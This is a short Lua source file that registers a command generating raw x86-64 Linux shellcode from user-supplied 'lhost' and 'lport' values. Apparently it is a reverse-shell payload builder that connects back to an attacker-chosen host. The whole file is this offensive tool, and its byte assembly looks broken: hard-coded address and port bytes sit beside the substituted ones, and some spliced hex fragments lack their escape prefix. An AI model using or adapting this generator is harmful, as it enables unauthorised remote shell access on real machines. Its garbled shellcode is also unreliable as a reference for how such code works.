function generate_linux_raw_shellcode()
    local lhost = app.params["lhost"]
    local lport = app.params["lport"]

    if not lhost or not lport then
        return "Error: lhost or lport not defined."
    end

    local ip_octets = {}
    for octet in lhost:gmatch("%d+") do
        table.insert(ip_octets, tonumber(octet))
    end
    local ip_hex_le = string.format("%02X%02X%02X%02X", ip_octets[1], ip_octets[2], ip_octets[3], ip_octets[4])

    local port_num = tonumber(lport)
    local port_hex_be = string.format("%04X", port_num)

    local shellcode = ""
    -- Instrucciones (ejemplo simplificado y puede variar según la arquitectura y syscalls)
    shellcode = shellcode .. "\\x48\\x31\\xd2\\x52\\x48\\xb8\\x02\\x00\\x01\\xbb" -- socket(AF_INET, SOCK_STREAM, 0)
    shellcode = shellcode .. "\\x00\\x00\\x00\\x00\\x50\\x48\\x89\\xe6\\x48\\x31\\xc9\\x41\\xb8\\x02\\x00\\x16\\x19" -- syscall 41
    shellcode = shellcode .. "\\x41\\xba" .. string.sub(port_hex_be, 3, 4) .. "\\x" .. string.sub(port_hex_be, 1, 2)
    shellcode = shellcode .. "\\x48\\xc7\\xc1" .. string.sub(ip_hex_le, 7, 8) .. "\\x" .. string.sub(ip_hex_le, 5, 6)
    shellcode = shellcode .. "\\x" .. string.sub(ip_hex_le, 3, 4) .. "\\x" .. string.sub(ip_hex_le, 1, 2)
    shellcode = shellcode .. "\\x56\\x48\\x89\\xe2\\x48\\x31\\xc0\\xb0\\x2a\\x0f\\x05\\x48\\x97\\x48\\xb8\\x3b\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x31\\xf6\\x56\\x48\\x89\\xe6\\x48\\x31\\xd2\\x52\\x57\\x48\\x89\\xe7\\x0f\\x05\\x6a\\x3b\\x58\\x0f\\x05"

    return "Raw Shellcode generated:\n\n" .. shellcode
end

register_command("generate_linux_raw_shellcode", generate_linux_raw_shellcode)